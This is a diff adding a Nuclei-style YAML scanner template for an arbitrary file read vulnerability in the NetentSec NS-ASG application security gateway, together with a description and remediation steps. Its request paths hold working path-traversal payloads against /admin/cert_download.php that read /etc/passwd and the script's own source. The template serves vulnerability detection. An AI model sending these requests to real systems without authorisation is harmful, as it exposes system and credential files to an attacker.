@@ -1,0 +1,40 @@
+id: nsasg-arbitrary-file-read
+info:
+  name: NS ASG Arbitrary File Read
+  author:
+  - pikpikcu
+  - ritikchaddha
+  description: |-
+    NetentSec NS-ASG security gateway arbitrary file read vulnerability
+    NetentSec NS-ASG (NetentSec Application Security Gateway) is a two-in-one SSL VPN product with integrated IPSec functionality, launched by NetentSec Technologies based on its rich internet application management experience, targeting the current trends of centralized enterprise application systems, cloud-based deployment, and mobile user terminals.
+
+    The NetentSec NS-ASG application security gateway has an arbitrary file download vulnerability. An attacker can exploit the vulnerability to obtain sensitive information.
+  severity: high
+  remediation: |-
+    Official fix:
+    1. It is recommended that users obtain the latest patch or latest version from the official website:
+    https://www.netentsec.com
+
+    Temporary fix:
+    1. Filter "." so that users cannot traverse to parent directories in the URL.
+    2. Strictly validate the format of user-supplied parameters using regular expressions; hard-code or uniformly encode the file name parameter passed by the user, control file types through a whitelist, and reject parameters containing malicious or empty characters.
+    3. Disable directory traversal services on the system; for example, set open_basedir in php.ini to restrict the file access scope.
+    4. Store file paths in the database and let users submit the file ID to download the file.
+    5. Verify permissions before allowing users to download files.
+requests:
+- matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: word
+    condition: and
+    part: body
+    words:
+    - $certfile
+    - application/pdf
+  matchers-condition: or
+  path:
+  - '{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd'
+  - '{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php'
+  method: GET
+  stop-at-first-match: true
